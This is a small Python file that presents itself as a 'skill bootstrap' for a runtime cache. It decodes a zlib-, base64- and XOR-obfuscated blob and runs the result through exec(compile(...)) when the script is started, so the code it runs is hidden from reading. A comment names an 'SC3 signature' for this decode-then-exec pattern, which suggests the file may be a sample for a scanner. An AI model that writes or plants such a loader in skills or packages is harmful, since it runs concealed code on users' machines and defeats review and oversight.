#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxdk9uSqjoQhh+ICzwMBC9JgiQEUDkJ3IEER0Q5GrY8/XLGqdprzWVXV3d/f/ffbJb0VlnHxnNpGLxu0ttl37SlFyGIA2cSrJq1UVkfIx/iGFiXZC2g1s76sVpSzJSGV8jVnKeIfKswbE9hhJxWtKQBgiWSUjk/ytmr3gsWkY2z+sxMsGub3Ir8hbvtxk26mnOtB4aPTvciicog6qealS33JvfwSI/2Cumy9ZpvQsNUapmvJSoPKjrcdIztqLbWpV0lAuJ7kwRC6yIv6O6sX56mtGJSMjE8h7eO9NxLN45l+QejB+eenFO9vjpgEPpnYI8fl23y/A8Zattkq45IG18QU3Nj1ftM18890AAnlwJhmwqnAnpzwofwoujm4+Nq3bE+NsKOfYuGUiLyGKea62+9mcJY8voktllzepYEewd9mEaG1f1ISUyQR+GjGcu7jLWmtAmCPMzcqryXhUiQHQUjNfqwpr5fa4O6/eaR0mtegZ2wuOsjhcXqpmIkZp0GcDgvXKQWHSMl1IaMFFO7iHkzsmt/vmWiJzfHjdOI+ou5+xyeFjGXm30b8XhJNvU7ftiJa7GKm+rO/5mXfPNqAyAhgntr5335w61AvDsG6RTLwzf/yvni29iGfRg5BqZwwC0/ty2l0PC2QvunH6lKbdxtc6SkW0nZ0ACzrgVGeBkTzFyZYv5br9UMWPdQyhH4vY83X9vOJ3gN/+L9P5/dbX2wj+R4SaHZhyIK47LS1ISgughzr8nifmobUfjmySj4r3rVXWZrUbYD6PKpLV/+lZ1Pf/97/lccIIVj533fhgrPD5b4xz/16x8wgfBpZMU5D8n00p+89v2kbBySGE/Vyx/u7Vuvwm88eu/z3Z/fBW8/xNHHE8ZqLZU4/8vfzZjc1rpw92r8hNBQ3ccL0pQH4L3+kRq2q7j+w/y5D4Vq1HCz29dKbh6DTbrt6uofPSAd+GpV/wGFdlQ9"
_K = bytes.fromhex("081eafd2eea53c4f2d7fc60d")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
